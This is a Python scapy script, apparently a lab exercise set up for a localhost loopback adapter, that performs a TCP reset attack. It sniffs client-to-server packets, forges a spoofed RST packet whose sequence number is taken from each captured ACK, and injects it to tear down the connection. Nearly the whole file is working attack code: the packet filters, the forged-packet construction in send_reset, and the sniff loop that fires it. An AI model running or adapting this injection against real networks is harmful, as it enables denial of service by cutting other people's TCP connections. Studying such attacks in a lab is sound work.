import scapy.all as scapy

from scapy.layers.inet import TCP, IP
from scapy.sendrecv import send

import warnings
warnings.filterwarnings('ignore')

DEFAULT_WINDOW_SIZE = 2052

# If one shot is active, only send the attack once, even if it fails.
one_shot = 1


# Logging for grabbed packets
def log(msg, params=None):
    if params is None:
        params = {}
    formatted_params = ' '.join([f'{k}={v}' for k, v in params.items()])
    print(f'{msg} {formatted_params}')


# Check if TCP connection is available
def is_packet_on_tcp_conn(server_ip, server_port, client_ip):
    def f(p):
        return is_packet_tcp_server_to_client(server_ip, server_port, client_ip)(p) or \
               is_packet_tcp_client_to_server(server_ip, server_port, client_ip)(p)
    return f


# Check if the packet is server to client
def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst

        return src_ip == server_ip and src_port == server_port and dst_ip == client_ip
    return f


# Check if packet is client to server
def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport

        return src_ip == client_ip and dst_ip == server_ip and dst_port == server_port
    return f


# Send the reset attack
def send_reset(iface, ignore_syn=True):
    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        # Log the grabbed packet
        log(
            'Grabbed packet',
            {
                'src_ip': src_ip,
                'dst_ip': dst_ip,
                'src_port': src_port,
                'dst_port': dst_port,
                'seq': seq,
                'ack': ack,
            }
        )

        # If the packet is a SYN, ignore it
        # Sending the RST here will not work
        if 'S' in flags and ignore_syn:
            print('Packet has SYN flag, not sending RST')
            return

        # Set the sequence number of the RST packet to the received ACK
        rst_seq = ack
        # Format the packet
        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags='R', window=DEFAULT_WINDOW_SIZE,
                                             seq=rst_seq)

        # Log the attack
        log(
            'Sending RST packet...',
            {
                'orig_ack': ack,
                'seq': rst_seq,
            },
        )

        # Send the attack
        send(p, verbose=0, iface=iface)

        if one_shot:
            exit(0)
    return f


# Show the logged packet
def log_packet(p):
    p.show()
    return p.show()


# Run main
# Interface name should be the loopback adapter or whatever interface is used
# We can use Wireshark to find the exact interface name of the device
# Localhost ip is currently set to default, which will be the same for the server/client
# Server port needs to be the same as the port that the server/client is operating on
if __name__ == '__main__':
    iface = '\\Device\\NPF_Loopback'
    localhost_ip = '127.0.0.1'
    localhost_server_port = 12345

    # Try to sniff a packet
    log('Starting sniff...')
    try:
        t = scapy.sniff(
            iface=iface,
            count=50,
            store=False,
            prn=send_reset(iface),
            # prn=log_packet,
            lfilter=is_packet_tcp_client_to_server(localhost_ip, localhost_server_port, localhost_ip))
    # If timed out (returns IndexError), finish sniffing.
    except IndexError:
        log('Finished sniffing!')
